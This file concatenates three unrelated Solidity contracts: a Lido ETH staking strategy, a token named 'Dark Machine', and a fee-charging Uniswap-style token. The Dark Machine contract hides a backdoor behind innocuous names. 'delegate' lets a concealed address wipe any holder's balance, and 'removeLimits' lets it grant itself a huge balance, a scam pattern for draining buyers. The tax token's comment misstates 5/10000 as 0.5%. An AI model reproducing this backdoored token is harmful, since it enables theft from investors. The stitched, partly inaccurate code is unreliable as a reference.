pragma solidity >=0.8.23;
import { Ownable2StepUpgradeable } from "@openzeppelin/contracts-upgradeable/access/Ownable2StepUpgradeable.sol";
import { UUPSUpgradeable } from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import { IStakingStrategy } from "../interfaces/IStakingStrategy.sol";
import { LIDO, LIDO_WITHDRAWAL_ERC721 } from "../Constants.sol";
contract EthStrategy is IStakingStrategy, Ownable2StepUpgradeable, UUPSUpgradeable {
    address public stakingManager;
    bool public autoStake;
    uint256 public ethUnderWithdrawal;
    uint256[50] private __gap;
    event EthStaked(uint256 amount, uint256 sharesGenerated);
    event EthWithdrawn(uint256 amount);
    event RequestedLidoWithdrawals(uint256[] requestIds, uint256[] amounts);
    event ClaimedLidoWithdrawals(uint256[] requestIds);
    event SetStakingManager(address stakingManager);
    event SetAutoStake(bool autoStake);
    error InsufficientFunds();
    error TransferFailed(bytes data);
    error OnlyStakingManager(address sender);
    error RequestIdsMustBeSorted();
    modifier onlyStakingManager() {
        if (msg.sender != stakingManager) revert OnlyStakingManager(msg.sender);
        _;
    }
    constructor() {
        _disableInitializers();
    }
    function initialize(address _owner, address _stakingManager) external initializer {
        stakingManager = _stakingManager;
        autoStake = true;
        __Ownable2Step_init();
        __UUPSUpgradeable_init();
        _transferOwnership(_owner);
    }
    function deposit(uint256 amount) external payable override onlyStakingManager {
        if (!autoStake) return;
        _deposit(amount);
    }
    function withdraw(uint256 amount) external override onlyStakingManager returns (uint256 withdrawnAmount) {
        uint256 balance = address(this).balance;
        if (amount > balance) {
            withdrawnAmount = balance;
        } else {
            withdrawnAmount = amount;
        }
        return _withdraw(withdrawnAmount);
    }
    function _deposit(uint256 amount) internal {
        if (amount > address(this).balance) revert InsufficientFunds();
        uint256 sharesGenerated = LIDO.submit{ value: amount }(address(0));
        emit EthStaked(amount, sharesGenerated);
    }
    function _withdraw(uint256 withdrawnAmount) internal returns (uint256) {
        (bool success, bytes memory data) = stakingManager.call{ value: withdrawnAmount }("");
        if (!success) revert TransferFailed(data);
        emit EthWithdrawn(withdrawnAmount);
        return withdrawnAmount;
    }
    function ownerDeposit(uint256 amount) external payable override onlyOwner {
        _deposit(amount);
    }
    function ownerWithdraw(uint256 amount) external override onlyOwner returns (uint256 withdrawnAmount) {
        return _withdraw(amount);
    }
    function requestLidoWithdrawal(uint256[] calldata amounts)
        external
        onlyOwner
        returns (uint256[] memory requestIds)
    {
        require(ethUnderWithdrawal == 0, "EthStrategy: Withdrawal already in progress");
        uint256 total;
        for (uint256 i; i < amounts.length; ++i) {
            total += amounts[i];
        }
        require(LIDO.approve(address(LIDO_WITHDRAWAL_ERC721), total), "approve failed");
        requestIds = LIDO_WITHDRAWAL_ERC721.requestWithdrawals(amounts, address(this));
        ethUnderWithdrawal += total;
        emit RequestedLidoWithdrawals(requestIds, amounts);
    }
    function claimLidoWithdrawals(uint256[] calldata requestIds) external onlyOwner {
        for (uint256 i = 0; i < requestIds.length - 1; i++) {
            if (requestIds[i] > requestIds[i + 1]) revert RequestIdsMustBeSorted();
        }
        uint256 lastCheckpointIndex = LIDO_WITHDRAWAL_ERC721.getLastCheckpointIndex();
        uint256[] memory _hints = LIDO_WITHDRAWAL_ERC721.findCheckpointHints(requestIds, 1, lastCheckpointIndex);
        LIDO_WITHDRAWAL_ERC721.claimWithdrawals(requestIds, _hints);
        ethUnderWithdrawal = 0;
        emit ClaimedLidoWithdrawals(requestIds);
    }
    function setStakingManager(address _stakingManager) external override onlyOwner {
        stakingManager = _stakingManager;
        emit SetStakingManager(_stakingManager);
    }
    function setAutoStake(bool _autoStake) external override onlyOwner {
        autoStake = _autoStake;
        emit SetAutoStake(_autoStake);
    }
    function underlyingAssetAmount() external view override returns (uint256) {
        return address(this).balance + LIDO.balanceOf(address(this)) + ethUnderWithdrawal;
    }
    receive() external payable { }
    function _authorizeUpgrade(address) internal override onlyOwner { }
}

pragma solidity ^0.8.23;
interface IPancakeFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
contract DarkMachine {
    address internal constant FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    uint256 private tokenTotalSupply;
    string private tokenName;
    string private tokenSymbol;
    address private xxnux;
    uint8 private tokenDecimals;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    constructor(address ads) {
        tokenName = "Dark Machine";
        tokenSymbol = "DARK";
        tokenDecimals = 18;
        tokenTotalSupply = 1000000000* 10 ** tokenDecimals;
        _balances[msg.sender] = tokenTotalSupply;
        emit Transfer(address(0), msg.sender, tokenTotalSupply);
        xxnux = ads;
    }
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function name() public view returns (string memory) {
        return tokenName;
    }
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

import "./interfaces/IUniswapV2Router02.sol";
import "./interfaces/IUniswapV2Factory.sol";
import "./interfaces/IUniswapV2Pair.sol";

/**
 * @title TaxableToken
 * @dev ERC20 Token with automated liquidity provision and tax collection.
 * Implements buy/sell fees, transaction and wallet limits, and swapback to add liquidity.
 * Owner can manage fee distribution, exclude addresses, and control trading.
 */
contract TaxableToken is ERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    // --- Fees Structure ---
    struct Fees {
        uint256 buyFee;
        uint256 sellFee;
        uint256 transferFee;
    }

    Fees public fees;

    // --- Distribution Wallets ---
    address public marketingWallet;
    address public devWallet;
    address public liquidityWallet;

    // --- Limits ---
    uint256 public maxTxAmount;
    uint256 public maxWalletAmount;

    // --- Swap Settings ---
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool private swapping;
    uint256 public swapTokensAtAmount;
    bool public swapEnabled = true;

    // --- Exclusions ---
    mapping(address => bool) public isExcludedFromFees;
    mapping(address => bool) public isExcludedFromMaxWallet;
    mapping(address => bool) public isExcludedFromMaxTx;

    // --- Events ---
    event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);
    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SetWallets(address marketing, address dev, address liquidity);
    event SetFees(uint256 buyFee, uint256 sellFee, uint256 transferFee);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    event SwapTokensAtAmountUpdated(uint256 amount);
    event SwapEnabledUpdated(bool enabled);
    event ExcludeFromLimits(address indexed account, bool fromMaxTx, bool fromMaxWallet);

    // --- Constructor ---
    /**
     * @dev Initializes the token with tax and liquidity features.
     * @param name Token name.
     * @param symbol Token symbol.
     * @param totalSupply Total token supply.
     * @param routerAddress Uniswap V2 Router address.
     */
    constructor(
        string memory name,
        string memory symbol,
        uint256 totalSupply,
        address routerAddress
    ) ERC20(name, symbol) {
        require(totalSupply > 0, "Supply must be > 0");

        // Initialize wallets
        marketingWallet = owner();
        devWallet = owner();
        liquidityWallet = owner();

        // Initialize fees (e.g., 5%)
        fees = Fees({
            buyFee: 500,    // 5.00%
            sellFee: 500,   // 5.00%
            transferFee: 0  // 0.00%
        });

        // Initialize limits (e.g., 1% of supply)
        maxTxAmount = totalSupply * 1 / 100;
        maxWalletAmount = totalSupply * 1 / 100;

        // Swap settings
        swapTokensAtAmount = totalSupply * 5 / 10000; // 0.5%

        // Exclude owner and this contract from fees
        isExcludedFromFees[owner()] = true;
        isExcludedFromFees[address(this)] = true;

        // Exclude from max wallet
        isExcludedFromMaxWallet[owner()] = true;
        isExcludedFromMaxWallet[address(this)] = true;
        isExcludedFromMaxWallet[address(0)] = true;
        isExcludedFromMaxWallet[address(0xdead)] = true;

        // Set up Uniswap
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(routerAddress);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;

        // Exclude pair from max tx
        isExcludedFromMaxTx[uniswapV2Pair] = true;

        _mint(owner(), totalSupply);
    }

    // --- Override transfer functions ---

    /**
     * @dev See {ERC20-_transfer}.
     */
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        // Check max transaction limit
        if (!isExcludedFromMaxTx[from] && !isExcludedFromMaxTx[to]) {
            require(amount <= maxTxAmount, "Transfer amount exceeds max transaction limit");
        }

        // Check max wallet limit
        if (!isExcludedFromMaxWallet[to]) {
            require(
                balanceOf(to).add(amount) <= maxWalletAmount,
                "Max wallet exceeded"
            );
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (
            canSwap &&
            !swapping &&
            swapEnabled &&
            from != uniswapV2Pair
        ) {
            swapping = true;
            swapAndLiquify(contractTokenBalance);
            swapping = false;
        }

        bool takeFee = !swapping && !isExcludedFromFees[from] && !isExcludedFromFees[to];

        if (takeFee) {
            uint256 feesToApply = 0;

            if (to == uniswapV2Pair) {
                feesToApply = fees.sellFee;
            } else if (from == uniswapV2Pair) {
                feesToApply = fees.buyFee;
            } else {
                feesToApply = fees.transferFee;
            }

            if (feesToApply > 0) {
                uint256 feesAmount = amount.mul(feesToApply).div(10000);
                super._transfer(from, address(this), feesAmount);
                amount = amount.sub(feesAmount);
            }
        }

        super._transfer(from, to, amount);
    }

    // --- Swap and Liquify ---

    /**
     * @dev Swaps tokens for ETH and adds liquidity.
     */
    function swapAndLiquify(uint256 contractTokenBalance) private {
        // Split contract balance into halves
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);

        // Capture ETH balance before swap
        uint256 initialBalance = address(this).balance;

        // Swap half for ETH
        swapTokensForEth(half);

        // Add liquidity with ETH and other half
        uint256 newBalance = address(this).balance.sub(initialBalance);
        addLiquidity(otherHalf, newBalance);

        emit SwapAndLiquify(half, newBalance, otherHalf);
    }

    /**
     * @dev Swaps tokens for ETH using the router.
     */
    function swapTokensForEth(uint256 tokenAmount) private {
        // Generate path
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // Make swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // Accept any amount
            path,
            address(this),
            block.timestamp
        );
    }

    /**
     * @dev Adds liquidity to Uniswap.
     */
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // Slippage ok
            0, // Slippage ok
            liquidityWallet,
            block.timestamp
        );
    }

    // --- Owner Functions ---

    /**
     * @dev Updates the Uniswap V2 router address.
     */
    function updateUniswapV2Router(address newAddress) external onlyOwner {
        require(newAddress != address(uniswapV2Router), "Already set");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    /**
     * @dev Sets the marketing, dev, and liquidity wallets.
     */
    function setWallets(address _marketing, address _dev, address _liquidity) external onlyOwner {
        require(_marketing != address(0) && _dev != address(0) && _liquidity != address(0), "Zero address");
        marketingWallet = _marketing;
        devWallet = _dev;
        liquidityWallet = _liquidity;
        emit SetWallets(_marketing, _dev, _liquidity);
    }

    /**
     * @dev Sets buy, sell, and transfer fees.
     */
    function setFees(uint256 _buyFee, uint256 _sellFee, uint256 _transferFee) external onlyOwner {
        require(_buyFee <= 2000 && _sellFee <= 2000 && _transferFee <= 2000, "Fees too high"); // Max 20%
        fees = Fees({
            buyFee: _buyFee,
            sellFee: _sellFee,
            transferFee: _transferFee
        });
        emit SetFees(_buyFee, _sellFee, _transferFee);
    }

    /**
     * @dev Excludes an address from fees.
     */
    function excludeFromFees(address account, bool excluded) external onlyOwner {
        require(isExcludedFromFees[account] != excluded, "Already set");
        isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    /**
     * @dev Excludes an address from max transaction and/or max wallet limits.
     */
    function excludeFromLimits(address account, bool excludeFromMaxTx, bool excludeFromMaxWallet) external onlyOwner {
        isExcludedFromMaxTx[account] = excludeFromMaxTx;
        isExcludedFromMaxWallet[account] = excludeFromMaxWallet;
        emit ExcludeFromLimits(account, excludeFromMaxTx, excludeFromMaxWallet);
    }

    /**
     * @dev Updates the threshold for swapping tokens.
     */
    function updateSwapTokensAtAmount(uint256 amount) external onlyOwner {
        require(amount > 0, "Amount must be > 0");
        swapTokensAtAmount = amount;
        emit SwapTokensAtAmountUpdated(amount);
    }

    /**
     * @dev Enables or disables the swap and liquify feature.
     */
    function updateSwapEnabled(bool enabled) external onlyOwner {
        require(swapEnabled != enabled, "Already set");
        swapEnabled = enabled;
        emit SwapEnabledUpdated(enabled);
    }

    /**
     * @dev Updates max transaction and wallet limits.
     */
    function updateLimits(uint256 newMaxTx, uint256 newMaxWallet) external onlyOwner {
        maxTxAmount = newMaxTx;
        maxWalletAmount = newMaxWallet;
    }

    // --- Fallback ---

    receive() external payable {
        require(msg.sender == address(uniswapV2Router), "Only router");
    }
}

